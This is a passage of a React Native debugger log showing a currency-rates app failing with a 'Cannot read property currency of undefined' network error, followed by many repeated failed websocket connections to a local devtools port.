936.07\\\",\\\"ETH\\\":\\\"17.51773671\\\",\\\"EUR\\\":\\\"5752.16\\\",\\\"FJD\\\":\\\"14382.93\\\",\\\"FKP\\\":\\\"4994.17\\\",\\\"GBP\\\":\\\"5020.51\\\",\\\"GEL\\\":\\\"17068.31\\\",\\\"GGP\\\":\\\"4994.17\\\",\\\"GHS\\\":\\\"31329.63\\\",\\\"GIP\\\":\\\"4994.17\\\",\\\"GMD\\\":\\\"332991.79\\\",\\\"GNF\\\":\\\"63517902\\\",\\\"GTQ\\\":\\\"52185.99\\\",\\\"GYD\\\":\\\"1454897.66\\\",\\\"HKD\\\":\\\"55236.03\\\",\\\"HNL\\\":\\\"166650.06\\\",\\\"HRK\\\":\\\"42544.92\\\"[...]\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"stdout\",\"output\":\"[Network error]: TypeError: Cannot read property 'currency' of undefined\\n\",\"source\":{\"name\":\"crna-entry.bundle\",\"path\":\"/Users/test/Documents/dev/Projects/Omni/react/native/.vscode/.react/crna-entry.bundle\"},\"line\":125698,\"column\":43}}\n[Network error]: TypeError: Cannot read property 'currency' of undefined\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"stdout\",\"output\":\"\\ncurrentCurrency: undefined\\nonCurrencyChange: undefined\\nrates: undefined\\nerror: Error: Network error: Cannot read property 'currency' of undefined\\nloading: false\\n\\n\",\"source\":{\"name\":\"crna-entry.bundle\",\"path\":\"/Users/test/Documents/dev/Projects/Omni/react/native/.vscode/.react/crna-entry.bundle\"},\"line\":113559,\"column\":20}}\nTo RN APP: {\"replyID\":10184,\"result\":\"[[140,140,140,140,140,140,142,142,142,142,142],[0,1,0,1,0,1,5,5,3,4,4],[[8,100,1523203741250,false],[8],[10,100,1523203741254,false],[10],[12,100,1523203741255,false],[12],[12,\\\"RCTRawText\\\",51,{\\\"text\\\":\\\"An error has occurred: Error: Network error: Cannot read property 'currency' of undefined\\\"}],[13,\\\"RCTText\\\",51,{\\\"accessible\\\":true,\\\"allowFontScaling\\\":true,\\\"ellipsizeMode\\\":\\\"tail\\\"}],[13,[12]],[6,[],[],[],[],[0]],[6,[],[],[13],[0],[]]],46]\"}\nFrom RN APP: {\"id\":10185,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[1]]]}\nTo RN APP: {\"replyID\":10185,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},1]],57]\"}\nFrom RN APP: {\"id\":10186,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":1}]]}\nTo RN APP: {\"replyID\":10186,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[25,2000,1523203743058,false],[1],[1],[1],[1]],62]\"}\nFrom RN APP: {\"id\":10187,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[25]]]}\nTo RN APP: {\"replyID\":10187,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},2]],67]\"}\nFrom RN APP: {\"id\":10188,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":2}]]}\nTo RN APP: {\"replyID\":10188,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[26,2000,1523203745078,false],[1],[1],[1],[1]],72]\"}\nFrom RN APP: {\"id\":10189,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[26]]]}\nTo RN APP: {\"replyID\":10189,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},3]],77]\"}\nFrom RN APP: {\"id\":10190,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":3}]]}\nTo RN APP: {\"replyID\":10190,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[27,2000,1523203747098,false],[1],[1],[1],[1]],82]\"}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"target/notification/onScriptParsed\",\"data\":{\"Versions.Target.Version\":\"v9.7.1\",\"aggregated.startTime\":\"[\\\"1523203739233\\\",\\\"1523203739240\\\",\\\"1523203739244\\\",\\\"1523203739250\\\",\\\"1523203739251\\\",\\\"1523203739257\\\",\\\"1523203739263\\\",\\\"1523203739263\\\",\\\"1523203739267\\\",\\\"1523203739269\\\",\\\"1523203739271\\\",\\\"1523203739277\\\",\\\"1523203739281\\\",\\\"1523203739282\\\",\\\"1523203739285\\\",\\\"1523203739285\\\",\\\"1523203739286\\\",\\\"1523203739289\\\",\\\"1523203739289\\\",\\\"1523203739293\\\",\\\"1523203739294\\\",\\\"1523203739296\\\",\\\"1523203739300\\\",\\\"1523203739306\\\",\\\"1523203739307\\\",\\\"1523203739316\\\",\\\"1523203739316\\\",\\\"1523203739317\\\",\\\"1523203739320\\\",\\\"1523203739321\\\",\\\"1523203739323\\\",\\\"1523203739331\\\",\\\"1523203739331\\\",\\\"1523203739331\\\",\\\"1523203739331\\\",\\\"1523203739333\\\",\\\"1523203739333\\\",\\\"1523203739334\\\",\\\"1523203739339\\\",\\\"1523203739349\\\",\\\"1523203739349\\\",\\\"1523203739353\\\",\\\"1523203739353\\\",\\\"1523203739356\\\",\\\"1523203739357\\\",\\\"1523203739359\\\",\\\"1523203739362\\\",\\\"1523203739367\\\",\\\"1523203739370\\\",\\\"1523203739370\\\",\\\"1523203739370\\\",\\\"1523203739371\\\",\\\"1523203739372\\\",\\\"1523203739372\\\",\\\"1523203739373\\\",\\\"1523203739374\\\",\\\"1523203739376\\\",\\\"1523203739377\\\",\\\"1523203739377\\\",\\\"1523203739380\\\",\\\"1523203739398\\\",\\\"1523203740529\\\",\\\"1523203740593\\\",\\\"1523203740817\\\",\\\"1523203740830\\\",\\\"1523203740836\\\",\\\"1523203740837\\\",\\\"1523203740862\\\",\\\"1523203740921\\\",\\\"1523203740925\\\",\\\"1523203740975\\\"]\",\"aggregated.successful\"[...]\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"target/notification/onPaused\",\"data\":{\"Versions.Target.Version\":\"v9.7.1\",\"aggregated.startTime\":\"[\\\"1523203739404\\\"]\",\"aggregated.successful\":\"[\\\"true\\\"]\",\"aggregated.timeTakenInMilliseconds\":\"[\\\"78.586701\\\"]\"}}}\nFrom RN APP: {\"id\":10191,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[27]]]}\nTo RN APP: {\"replyID\":10191,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},4]],87]\"}\nFrom RN APP: {\"id\":10192,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":4}]]}\nTo RN APP: {\"replyID\":10192,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[28,2000,1523203749274,false],[1],[1],[1],[1]],92]\"}\nFrom RN APP: {\"id\":10193,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[28]]]}\nTo RN APP: {\"replyID\":10193,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},5]],97]\"}\nFrom RN APP: {\"id\":10194,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":5}]]}\nTo RN APP: {\"replyID\":10194,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[29,2000,1523203751294,false],[1],[1],[1],[1]],102]\"}\nFrom RN APP: {\"id\":10195,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[29]]]}\nTo RN APP: {\"replyID\":10195,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},6]],107]\"}\nFrom RN APP: {\"id\":10196,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":6}]]}\nTo RN APP: {\"replyID\":10196,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[30,2000,1523203753312,false],[1],[1],[1],[1]],112]\"}\nFrom RN APP: {\"id\":10197,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[30]]]}\nTo RN APP: {\"replyID\":10197,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},7]],117]\"}\nFrom RN APP: {\"id\":10198,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":7}]]}\nTo RN APP: {\"replyID\":10198,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[31,2000,1523203755329,false],[1],[1],[1],[1]],122]\"}\nFrom RN APP: {\"id\":10199,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[31]]]}\nTo RN APP: {\"replyID\":10199,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},8]],127]\"}\nFrom RN APP: {\"id\":10200,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":8}]]}\nTo RN APP: {\"replyID\":10200,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[32,2000,1523203757358,false],[1],[1],[1],[1]],132]\"}\nFrom RN APP: {\"id\":10201,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[32]]]}\nTo RN APP: {\"replyID\":10201,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},9]],137]\"}\nFrom RN APP: {\"id\":10202,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":9}]]}\nTo RN APP: {\"replyID\":10202,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[33,2000,1523203759378,false],[1],[1],[1],[1]],142]\"}\nFrom RN APP: {\"id\":10203,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[33]]]}\nTo RN APP: {\"replyID\":10203,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},10]],147]\"}\nFrom RN APP: {\"id\":10204,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":10}]]}\nTo RN APP: {\"replyID\":10204,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[34,2000,1523203761406,false],[1],[1],[1],[1]],152]\"}\nFrom RN APP: {\"id\":10205,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[34]]]}\nTo RN APP: {\"replyID\":10205,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},11]],157]\"}\nFrom RN APP: {\"id\":10206,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":11}]]}\nTo RN APP: {\"replyID\":10206,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[35,2000,1523203763425,false],[1],[1],[1],[1]],162]\"}\nFrom RN APP: {\"id\":10207,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[35]]]}\nTo RN APP: {\"replyID\":10207,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},12]],167]\"}\nFrom RN APP: {\"id\":10208,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":12}]]}\nTo RN APP: {\"replyID\":10208,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[36,2000,1523203765448,false],[1],[1],[1],[1]],172]\"}\nFrom RN APP: {\"id\":10209,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[36]]]}\nTo RN APP: {\"replyID\":10209,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},13]],177]\"}\nFrom RN APP: {\"id\":10210,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":13}]]}\nTo RN APP: {\"replyID\":10210,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[37,2000,1523203767468,false],[1],[1],[1],[1]],182]\"}\nFrom RN APP: {\"id\":10211,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[37]]]}\nTo RN APP: {\"replyID\":10211,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},14]],187]\"}\nFrom RN APP: {\"id\":10212,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":14}]]}\nTo RN APP: {\"replyID\":10212,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[38,2000,1523203769483,false],[1],[1],[1],[1]],192]\"}\nFrom RN APP: {\"id\":10213,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[38]]]}\nTo RN APP: {\"replyID\":10213,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},15]],197]\"}\nFrom RN APP: {\"id\":10214,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":15}]]}\nTo RN APP: {\"replyID\":10214,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[39,2000,1523203771515,false],[1],[1],[1],[1]],202]\"}\nFrom RN APP: {\"id\":10215,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[39]]]}\nTo RN APP: {\"replyID\":10215,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},16]],207]\"}\nFrom RN APP: {\"id\":10216,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":16}]]}\nTo RN APP: {\"replyID\":10216,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[40,2000,1523203773545,false],[1],[1],[1],[1]],212]\"}\nFrom RN APP: {\"id\":10217,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[40]]]}\nTo RN APP: {\"replyID\":10217,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},17]],217]\"}\nFrom RN APP: {\"id\":10218,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":17}]]}\nTo RN APP: {\"replyID\":10218,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[41,2000,1523203775619,false],[1],[1],[1],[1]],222]\"}\nFrom RN APP: {\"id\":10219,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[41]]]}\nTo RN APP: {\"replyID\":10219,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},18]],227]\"}\nFrom RN APP: {\"id\":10220,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":18}]]}\nTo RN APP: {\"replyID\":10220,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[42,2000,1523203777639,false],[1],[1],[1],[1]],232]\"}\nFrom RN APP: {\"id\":10221,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[42]]]}\nTo RN APP: {\"replyID\":10221,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},19]],237]\"}\nFrom RN APP: {\"id\":10222,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":19}]]}\nTo RN APP: {\"replyID\":10222,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[43,2000,1523203779657,false],[1],[1],[1],[1]],242]\"}\nFrom RN APP: {\"id\":10223,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[43]]]}\nTo RN APP: {\"replyID\":10223,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},20]],247]\"}\nFrom RN APP: {\"id\":10224,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":20}]]}\nTo RN APP: {\"replyID\":10224,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[44,2000,1523203781686,false],[1],[1],[1],[1]],252]\"}\nFrom RN APP: {\"id\":10225,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[44]]]}\nTo RN APP: {\"replyID\":10225,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},21]],257]\"}\nFrom RN APP: {\"id\":10226,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":21}]]}\nTo RN APP: {\"replyID\":10226,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[45,2000,1523203783703,false],[1],[1],[1],[1]],262]\"}\nFrom RN APP: {\"id\":10227,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[45]]]}\nTo RN APP: {\"replyID\":10227,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},22]],267]\"}\nFrom RN APP: {\"id\":10228,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":22}]]}\nTo RN APP: {\"replyID\":10228,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[46,2000,1523203785722,false],[1],[1],[1],[1]],272]\"}\nFrom RN APP: {\"id\":10229,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[46]]]}\nTo RN APP: {\"replyID\":10229,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},23]],277]\"}\nFrom RN APP: {\"id\":10230,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":23}]]}\nTo RN APP: {\"replyID\":10230,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[47,2000,1523203787751,false],[1],[1],[1],[1]],282]\"}\nFrom RN APP: {\"id\":10231,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[47]]]}\nTo RN APP: {\"replyID\":10231,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},24]],287]\"}\nFrom RN APP: {\"id\":10232,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":24}]]}\nTo RN APP: {\"replyID\":10232,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[48,2000,1523203789782,false],[1],[1],[1],[1]],292]\"}\nFrom RN APP: {\"id\":10233,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[48]]]}\nTo RN APP: {\"replyID\":10233,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},25]],297]\"}\nFrom RN APP: {\"id\":10234,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":25}]]}\nTo RN APP: {\"replyID\":10234,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[49,2000,1523203791804,false],[1],[1],[1],[1]],302]\"}\nFrom RN APP: {\"id\":10235,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[49]]]}\nTo RN APP: {\"replyID\":10235,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},26]],307]\"}\nFrom RN APP: {\"id\":10236,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":26}]]}\nTo RN APP: {\"replyID\":10236,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[50,2000,1523203793823,false],[1],[1],[1],[1]],312]\"}\nFrom RN APP: {\"id\":10237,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[50]]]}\nTo RN APP: {\"replyID\":10237,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},27]],317]\"}\nFrom RN APP: {\"id\":10238,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":27}]]}\nTo RN APP: {\"replyID\":10238,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[51,2000,1523203795843,false],[1],[1],[1],[1]],322]\"}\nFrom RN APP: {\"id\":10239,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[51]]]}\nTo RN APP: {\"replyID\":10239,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},28]],327]\"}\nFrom RN APP: {\"id\":10240,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"RCTDeviceEventEmitter\",\"emit\",[\"websocketFailed\",{\"message\":\"The operation couldn\u2019t be completed. Connection refused\",\"id\":28}]]}\nTo RN APP: {\"replyID\":10240,\"result\":\"[[140,146,146,146,146],[0,5,5,5,5],[[52,2000,1523203797891,false],[1],[1],[1],[1]],332]\"}\nFrom RN APP: {\"id\":10241,\"method\":\"callFunctionReturnFlushedQueue\",\"arguments\":[\"JSTimers\",\"callTimers\",[[52]]]}\nTo RN APP: {\"replyID\":10241,\"result\":\"[[146,146,146,146,146],[6,6,6,6,1],[[\\\"websocketMessage\\\"],[\\\"websocketOpen\\\"],[\\\"websocketClosed\\\"],[\\\"websocketFailed\\\"],[\\\"ws://localhost:8097\\\",null,{\\\"headers\\\":{}},29]],337]\"}\nFrom RN APP: 